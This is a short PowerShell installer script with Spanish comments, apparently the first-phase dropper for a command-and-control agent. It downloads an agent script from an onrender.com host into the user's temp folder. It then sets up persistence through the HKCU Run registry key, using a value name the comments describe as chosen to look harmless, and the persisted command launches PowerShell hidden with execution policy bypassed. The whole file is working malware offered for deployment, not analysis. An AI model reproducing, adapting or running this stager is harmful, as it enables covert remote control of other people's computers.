# installer_mvp1.ps1 (MVP Fase 1) - Para despliegue en Render
# Descarga el agente y establece una persistencia simple mediante la clave Run.

# --- CONFIGURACIÓN ---
# Modifica estas variables para que coincidan con tu entorno desplegado en Render
$staticFilesBaseUrl = "https://exa-sw-fr2c.onrender.com" # Ej. "https://mi-c2-files.onrender.com/files"
$agentFileNameOnServer = "core_services_mvp1.ps1" 
# --------------------

$agentFileNameLocal = "core_services_mvp1.ps1" 
$tempDir = $env:TEMP
$agentPathLocal = Join-Path -Path $tempDir -ChildPath $agentFileNameLocal
$downloadUrl = "$($staticFilesBaseUrl)/$($agentFileNameOnServer)"

# Descomenta para depuración
# Write-Host "Intentando descargar agente desde: $downloadUrl"
# Write-Host "Guardando agente en: $agentPathLocal"

try {
    if (-not (Test-Path $tempDir)) {
        New-Item -Path $tempDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
    }
    (New-Object Net.WebClient).DownloadFile($downloadUrl, $agentPathLocal)
    # Write-Host "Agente descargado exitosamente." 
} catch {
    # Write-Host "Fallo en la descarga del agente: $($_.Exception.Message)" 
    exit 1 
}

$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$persistenceValueName = "SecureDevCoreServiceMVP1Render" # Nombre inocuo, diferenciado para Render
$commandToPersist = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$agentPathLocal`""

# Descomenta para depuración
# Write-Host "Intentando establecer persistencia:"
# Write-Host "Clave: $runKeyPath"
# Write-Host "Nombre: $persistenceValueName"
# Write-Host "Comando: $commandToPersist"

try {
    Set-ItemProperty -Path $runKeyPath -Name $persistenceValueName -Value $commandToPersist -Force -ErrorAction Stop
    # Write-Host "Persistencia establecida exitosamente."
} catch {
    # Write-Host "Fallo al establecer la persistencia: $($_.Exception.Message)" 
    exit 1
}

# Write-Host "Instalador MVP1 (Render) completado."
exit 0
